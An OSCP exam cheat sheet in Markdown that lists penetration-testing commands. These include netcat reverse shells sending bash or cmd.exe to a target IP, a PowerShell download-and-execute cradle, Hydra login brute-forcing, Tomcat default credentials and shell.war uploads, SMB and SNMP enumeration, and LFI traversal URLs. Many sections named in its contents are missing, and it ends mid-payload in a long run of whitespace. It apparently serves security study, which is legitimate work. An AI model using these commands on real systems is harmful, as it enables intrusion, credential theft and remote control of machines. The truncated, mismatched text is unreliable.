# OSCP-Cheat-Sheet

1. [Common Commands](#common-commands)
 
    - [Downloading Files (Curl / Wget)](#downloading-files-curl--wget)

    - [Download Files with PowerShell](#upload--download-files-with-netcat)

    - [Upload / Download Files with Netcat](#download-files-with-powershell)

    - [Netcat](#netcat)

    - [Reverse Shells](#reverse-shells)

    - [Upgrading Reverse Shells](#upgrading-reverse-shells)

2. [NMAP](#nmap)

    - [Common Switches](#common-switches)

    - [TCP Scan](#tcp-scan)

    - [UDP Scan](#udp-scan)

3. [SMB/Samba](#smbsamba)

4. [SNMP](#snmp)

    - [Windows SNMP MIB Values](#windows-snmp-mib-values)

5. [Web Servers](#web-servers)

    - [Wordlists](#wordlists)

    - [Bruteforcing POST Requests](#bruteforcing-post-requests)

    - [Tomcat](#tomcat)

        - [Default Credentials](#default-credentials)

        - [Uploading to Tomcat6](#uploading-to-tomcat6)

        - [Uploading to Tomcat7 and Above](#uploading-to-tomcat7-and-above)
    
    - [Local File Inclusion / Remote File Inclusion](#local-file-inclusion--remote-file-inclusion-lfi--rfi)

6. [FTP](#ftp)

    - [Bruteforce](#bruteforce)

    - [Download](#download)

    - [Upload](#upload)

7. [SMB Exploitation](#smb-exploitation)

    - [Eternal Blue (MS17-010)](#eternal-blue-ms17-010)

        - [Payload](#payload)

    - [MS08-067](#ms08-067)

        - [Payloads](#payloads)

8. [Linux Privilege Escalation](#linux-privilege-escalation)

    - [Enumeration Scripts](#enumeration-scripts)

    - [SUID Binaries](#suid-binaries)

9. [Windows Privilege Escalations](#windows-privilege-escalation)

    - [Enumeration Scripts](#enumeration-scripts-1)

    - [Juicy Potato](#juicy-potato)

        - [Vulnerable OS Versions](#vulnerable-os-versions)

        - [Generating the Payload](#generating-the-payload)

        - [Execution](#execution)

    - [Service Exploitation](#service-exploitation)

        - [Windows XP SP0/SP1](#windows-xp-sp0sp1)

10. [MSFvenom Payloads](#msfvenom-payloads)

    - [Linux](#linux)

    - [Windows](#windows)

    - [PHP](#php)

    - [JSP](#jsp)

    - [WAR](#war)

    - [ASP Payload](#asp-payload)

    - [ASP.NET Payload](#aspnet-payload)

    - [Python](#python)

    - [Bash](#bash)

    - [Perl](#perl)

## Common Commands

Python HTTP Server: <code>python -m SimpleHTTPServer [PORT]</code>

Python FTP Server: <code>python -m pyftpdlib -p 21</code>

Linux Listener: <code>nc -lnvp [PORT]</code>

Windows Listener: <code>nc.exe -lnvcp [PORT]</code>

Uploading a file with PUT: <code>curl -X PUT http://[IP]/[FILE] -d @[FILE]  -v</code>

### Downloading Files (Curl / Wget)

<code>curl [URL] -o [FILENAME]</code>

<code>wget [URL]</code>

### Download Files with PowerShell

<code>powershell Invoke-RestMethod -Uri '[URL]' -OutFile '[PATH\TO\FILE\]'</code>

<code>powershell IEX(New-Object Net.WebClient).DownloadString('[URL]')</code>

### Upload / Download Files with Netcat

Download: <code>nc -lnvp [PORT] > [OUT_FILE]</code>

Upload: <code>nc -nv [IP] [PORT] < [IN_FILE]</code>

### Netcat

Linux: <code>nc -nv [IP] [PORT] -e /bin/bash</code>

Windows: <code>nc.exe -nv [IP] [PORT] -e cmd.exe</code>

### Reverse Shells

[Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

### Upgrading Reverse Shells

Follow steps found [here](https://medium.com/bugbountywriteup/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2)

<code>python -c 'import pty;pty.spawn("/bin/bash")'</code>

<code>export TERM=screen</code>

Background the shell with <code>Ctrl+Z</code>

<code>stty raw echo</code>

Foreground the shell with <code>fg</code> 

Hit Return 2x

## NMAP

### Common Switches

<code>-A</code>: OS Fingerprinting

<code>-O</code>: OS Detection

<code>-sV</code>: Service Version/Enumeration

<code>-sC</code>: Enables Safe Scripts

<code>-Pn</code>: Avoids Ping Scans

<code>-sS</code>: Stealth Scan / SYN Scan

<code>-sU</code>: UDP Scan

<code>-v/-vv/-vvv</code>: Varying Levels of Verbosity

<code>-T[1-5]</code>: Speed of Scan (5 Being the Fastest)

<code>-p [PORT(S)]</code>: Specify Port, or Porvide Comma Seperated List of Ports

<code>-p-</code>: Full Port Scan

### TCP Scan

<code>nmap -v -sS -sC -sV -T4 -Pn -oA nmap/[filename.tcp] -p- [IP]</code>

### UDP Scan

<code>nmap -sU -v -sS -sC -sV -T4 -Pn -oA nmap/[filename.udp] [IP]</code>

## SNMP

<code>snmp-check [IP]</code>

<code>onesixtyone -c SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt [IP]</code>

<code>snmpbulkwalk -c [COMMUNITY_STRING] -v[VERSION] [IP]</code>

### Windows SNMP MIB Values

System Processes: <code>1.3.6.1.2.1.25.1.6.0</code>

Running Programs: <code>1.3.6.1.2.1.25.4.2.1.2</code>

Process Path: <code>1.3.6.1.2.1.25.4.2.1.4</code>

Storage Units: <code>1.3.6.1.2.1.25.2.3.1.4</code>

Software Name: <code>1.3.6.1.2.1.25.6.3.1.2</code>

User Accounts: <code>1.3.6.1.4.1.77.1.2.25</code>

TCP Local Ports: <code>1.3.6.1.2.1.6.13.1.3</code>

## SMB/Samba

<code>nmap -p 139,445 -Pn -script=smb-vuln* [IP]</code>

<code>smbclient -L //[IP]/</code>

<code>enum4linux -a [IP]</code>

<code>smbmap -H [IP]</code>

<code>./smbver.sh [IP]</code> [Found Here](https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon_enum/smbver.sh)

Logging into SMB Share

<code>smbclient //[IP]/[SHARE]</code>

Downloading all files from a directory

<code>smbclient //[IP]/[SHARE] -U [USER] -c "prompt OFF;recurse ON;mget *"</code>

## Werb Servers

<code>dirb [URL]</code>

<code>nikto -h [URL]</code>

### Wordlists

<code>cewl [URL]</code>

### Bruteforcing POST requests

<code>hydra -l/-L [USERNAME/USER_LIST] -P [PASSWORDLIST] [IP] http-form-post "[ENDPOINT]:[POST_PARAMETERS]&User=^USER^&Password=^PASS^:[FAILED_LOGIN_ERROR]."</code>

### Tomcat

#### Default Credentials

<code>admin:admin</code>

<code>tomcat:tomcat</code>

<code>admin:[NOTHING]</code>

<code>admin:s3cr3t</code>

<code>tomcat:s3cr3t</code>

<code>admin:tomcat</code>

#### Uploading to Tomcat6

<code>wget 'http://[USER]:[password]@[IP]:8080/manager/deploy?war=file:shell.war&path=/shell' -O -</code>

#### Uploading to Tomcat7 and Above

<code>curl -v -u [USER]:[PASSWORD] -T shell.war 'http://[IP]:8080/manager/text/deploy?path=/shellh&update=true'</code>

### Local File Inclusion / Remote File Inclusion (LFI / RFI)

[LFI / RFI Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

#### LFI

<code>http://[VULN_IP]/[VULN_PAGE]?[VULN_PARAMETER]=../../../../[PATH/TO/LOCAL/FILE]</code>

Linux: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt</code>

Windows: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt</code>

Both: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt</code>

#### RFI

<code><?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  